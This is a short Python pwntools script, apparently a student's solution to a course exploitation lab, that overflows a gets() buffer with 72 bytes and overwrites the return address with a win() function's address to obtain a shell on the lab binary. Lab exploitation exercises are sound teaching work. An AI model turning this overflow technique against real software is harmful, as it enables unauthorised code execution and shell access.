import pwn

if __name__ == "__main__":

    # Considering the similarity of this lab to lab1-2, I'm reusing a lot of my code.
    # After looking at the lab2-1.c file, I noticed the "void win()" function.
    # This function again calls "/bin/bash", allowing me to drop into a shell.

    # In the "int main()" function, gets is called.
    # This should allow me to jump to the win() function through a buffer overflow.

    # First, I need to get the address of the win() function.
    # I load the binary as an ELF file to analyse the symbols.
    victim_binary = pwn.ELF("./lab2-1.bin")
    # Then, I search for and capture the address.
    win_function_address = victim_binary.symbols["win"]
    
    # I run the process.
    # process_to_exploit = pwn.remote("csc748.hostbin.org", 7021)
    # This next line can replace the one above for testing against a local binary.
    process_to_exploit = pwn.process("./lab2-1.bin")

    buffer_overflower = b"0"*72
    instruction_redirect = pwn.p64(win_function_address)

    process_to_exploit.sendline(buffer_overflower + instruction_redirect)

    # Now I can drop into a shell.
    process_to_exploit.interactive()